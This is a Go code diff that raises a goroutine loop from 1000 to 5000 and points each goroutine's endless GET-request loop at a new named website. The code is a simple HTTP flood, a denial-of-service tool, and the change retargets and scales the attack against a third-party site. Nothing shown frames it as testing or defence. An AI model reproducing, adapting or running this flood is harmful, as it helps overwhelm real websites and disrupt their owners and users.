@@ -13,7 +13,7 @@ type Sender struct {
 
 func (s *Sender) send() {
 
-	for i := 0; i < 1000; i++ {
+	for i := 0; i < 5000; i++ {
 		s.app.Wg.Add(1)
 		go s.sendToItisw()
 
@@ -26,7 +26,7 @@ func (s *Sender) sendToItisw() {
 	client := &helper.HttpClient{}
 
 	for {
-		res := client.Request("http://www.penlsun.cn", "GET")
+		res := client.Request("https://www.class100.com/", "GET")
 		fmt.Printf(res)
 	}
 
